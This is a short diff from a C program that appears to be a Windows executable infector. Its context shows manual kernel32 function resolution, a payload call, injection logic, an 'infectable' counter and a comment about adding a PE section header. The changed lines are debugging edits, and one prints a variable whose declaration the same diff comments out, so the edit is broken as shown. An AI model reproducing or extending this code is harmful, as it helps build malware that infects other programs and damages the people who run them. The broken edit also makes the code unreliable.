@@ -44,6 +44,8 @@ int match_suffix(char *str, char* suffix) SET_SECT;
 #define K32_FUNCTION(name) ((t##name)get_kernel_32_func(s##name, i_ex_dir, image_base))
 #define LOAD(name) t##name p##name = (t##name)get_kernel_32_func(s##name, i_ex_dir, image_base)
 
+// int globbb SET_SECT = 0 ;
+
 int main()
 {
     payload();
@@ -286,8 +288,9 @@ const char empty_str[] = "";
             RET(inject);
         }
 
-char format[] = "infectable: %d\n";
+char format[] = "infeXXXble: %d\n";
 FUNCTION(printf)(format, infectable);
+FUNCTION(printf)(format, globbb);
         // ((UNICODE_STRING*)(entry->Reserved4))->Buffer;
 
         // ADDING new section header: 
